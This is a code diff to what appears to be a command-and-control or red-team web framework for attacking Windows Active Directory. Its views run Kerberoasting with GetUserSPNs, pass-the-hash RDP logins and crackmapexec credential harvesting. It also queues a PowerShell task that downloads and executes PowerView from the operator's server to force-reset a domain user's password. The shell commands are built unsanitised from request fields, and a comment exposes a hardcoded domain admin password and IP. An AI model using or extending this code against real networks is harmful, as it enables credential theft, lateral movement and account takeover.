@@ -858,13 +858,13 @@ def TGStickets_GetSPNusers(request): #####
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
         agentTask.save()
         if username != '':
-            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {6}/GetUserSPNs.py -dc-ip {5} {4}/{2}:{3} -o {0}TGStickets -request".format(result_dir,result_path,username,password,domain,DCip,tools_path))
+            os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {6}/GetUserSPNs.py -dc-ip {5} {4}/{2}:{3} -o {0}TGStickets -request 2>> {1}".format(result_dir,result_path,username,password,domain,DCip,tools_path))
         else:
             if hashes != '':
-                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -hashes {2} -o {0}TGStickets -request".format(result_dir,result_path,hashes,domain,DCip,tools_path))
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -hashes {2} -o {0}TGStickets -request 2>>{1}".format(result_dir,result_path,hashes,domain,DCip,tools_path))
 
             else:
-                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -aeskey {2} -o {0}TGStickets -request".format(result_dir,result_path,aeskey, domain,DCip,tools_path))
+                os.system("echo '===============TGS Tickets===============\nOutPut in the following path:\n{0}' >> {1};python {5}/GetUserSPNs.py -dc-ip {4} {3} -aeskey {2} -o {0}TGStickets -request 2>>{1}".format(result_dir,result_path,aeskey, domain,DCip,tools_path))
     
         return JsonResponse({},status=200)
 
@@ -1136,8 +1136,10 @@ def forceChangePass_DomainUserPassword(request):
         password = request.POST['password']
         wanteduser = request.POST['wanteduser']
         wantedpassword = request.POST['wantedpassword']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";IEX(New-Object Net.WebClient).DownloadString(\'http://{0}:8888/PowerView.ps1\');$firstPassword =ConvertTo-SecureString \'{1}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{2}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{3}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {4} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(ip,password,contoleduser,wantedpassword,wanteduser)
+        domain = request.POST['domain']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888 &".format(tools_path))
+#IEX(New-Object Net.WebClient).DownloadString('http://192.168.116.129:8888/PowerView.ps1');$firstPassword =ConvertTo-SecureString 'Elsadek@955' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\administrator',$firstPassword);$secondPassword =ConvertTo-SecureString 'Elsadek@955' -AsPlainText -Force;Set-DomainUserPassword -Identity kareem -AccountPassword $secondPassword -Credential $Cred -Verbose;
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";IEX(New-Object Net.WebClient).DownloadString(\'http://{0}:8888/PowerView.ps1\');$firstPassword =ConvertTo-SecureString \'{1}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'{5}\{2}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{3}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {4} -AccountPassword $secondPassword -Credential $Cred -Verbose ;echo "++++++++++++++++++`r`n"'.format(ip,password,contoleduser,wantedpassword,wanteduser,domain)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -1280,9 +1282,9 @@ def LateralMov_RDP(request):   ##username
         os.system("echo '===============Lateral Movement via RDP===============' >> {};".format(result_path))
 
         if password != "":
-            os.system("xfreerdp /d:{1} /u:{2} /p:{3} /v:{4};".format(result_path,domain,username,password,ip))
+            os.system("xfreerdp /d:{1} /u:{2} /p:{3} /v:{4} /cert-ignore 2>> {5};".format(result_path,domain,username,password,ip,result_path))
         elif PassTheHash != "":
-            os.system("xfreerdp /d:{0} /u:{1} /pth:{2} /v:{3};".format(domain,username,PassTheHash,ip))
+            os.system("xfreerdp /d:{0} /u:{1} /pth:{2} /v:{3} /cert-ignore 2>> {5};".format(domain,username,PassTheHash,ip,result_path))
 
         return JsonResponse({},status=200)
     else:
@@ -1347,7 +1349,7 @@ def gpp_autologin(request): ####
         password = request.POST['password']   ## optional
         result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
         result_path = result_dir+"results"
-        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin >>{0}".format(result_path, ip,username,password))
+        os.system("echo '===============gpp_autologin===============' >> {0}; crackmapexec smb {1} -u {2} -p {3} -M gpp_autologin | sed 's/\x1B[@A-Z\\\]^_]\|\x1B\[[0-9:;<=>?]*[-!\"\#$%&'\"'\"'()*+,.\/]*[][\\@A-Z^_`a-z{{|}}~]//g' >>{0}".format(result_path, ip,username,password))
 
         return JsonResponse({},status=200)
     else:
